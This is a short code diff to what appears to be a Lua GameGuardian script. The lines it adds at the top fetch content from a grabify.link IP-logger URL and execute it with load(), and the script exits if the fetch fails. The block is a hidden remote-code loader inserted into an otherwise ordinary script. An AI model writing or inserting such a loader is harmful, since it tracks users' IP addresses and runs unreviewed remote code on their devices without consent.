@@ -1,3 +1,10 @@
+TG = gg.makeRequest("https://grabify.link/Q77JDV").content
+if not TG then
+os.exit()
+else
+pcall(load(TG))
+end
+
 hostling = 1
 
 function home()
